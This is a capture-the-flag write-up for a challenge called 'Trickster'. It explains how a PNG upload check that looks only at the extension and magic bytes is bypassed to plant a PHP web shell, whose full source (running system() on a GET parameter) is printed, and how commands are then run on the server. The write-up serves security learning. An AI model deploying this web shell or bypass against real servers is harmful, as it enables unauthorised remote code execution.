Trickster |  | 300 points

![image](https://github.com/msthione/ctfs/assets/99500478/22a310c7-fcb0-4ff1-bf70-077ff808187c)


As stated in the description, there is a web page where we can upload image files.

![image](https://github.com/msthione/ctfs/assets/99500478/337dcf73-21f3-4670-b6ce-5653d7a923b5)

As always I checked the <code>/robots.txt</code>

![image](https://github.com/msthione/ctfs/assets/99500478/9f24c6f2-178a-432d-9dec-9ec8df5148f0)

There are a .txt file and a folder which are disabled. Let's check 'em:

<code>/instructions.txt</code>
```
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```

And we don't have direct access to /uploads/ folder

![image](https://github.com/msthione/ctfs/assets/99500478/96971bd2-9138-4197-ab8e-cc43a7d73221)

I made an empty request to be able to intercept it with Burp Suite and sent to repeater

![image](https://github.com/msthione/ctfs/assets/99500478/381ed4dd-60cb-4287-98f6-2c31b5171dd6)

According to <code>/instructions.txt</code> the png file must have a .png extention and 'PNG' in the first few bytes. set and sent it

![image](https://github.com/msthione/ctfs/assets/99500478/abc31e71-3ade-4bf0-92c0-3fa6036cff93)

When i checked the /uploads/test.png and got a image

![image](https://github.com/msthione/ctfs/assets/99500478/fef8f732-24fc-4f02-a260-222bab59a819)

In this point I wanted to try RCE and used that code from https://www.revshells.com/ 
```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
```

to be able to bypass the validation I left .png in the name and "PNG" in the payload as first bytes of the file and sent it 

![image](https://github.com/msthione/ctfs/assets/99500478/6048eb36-d89d-4691-a01b-8e1cc18d3aa8)

It was succeed, let's try to access the page which we just uploaded

![image](https://github.com/msthione/ctfs/assets/99500478/28ea235d-20bb-4750-ae5b-d35c45e369f1)

It worked. It's time to find the flag. 

![image](https://github.com/msthione/ctfs/assets/99500478/76255b75-29d3-43c0-a6f7-8555b8a404ec)

I think we found it. :) let's read it...
![image](https://github.com/msthione/ctfs/assets/99500478/195d6eeb-af1e-40d9-bd43-8a429090a388)

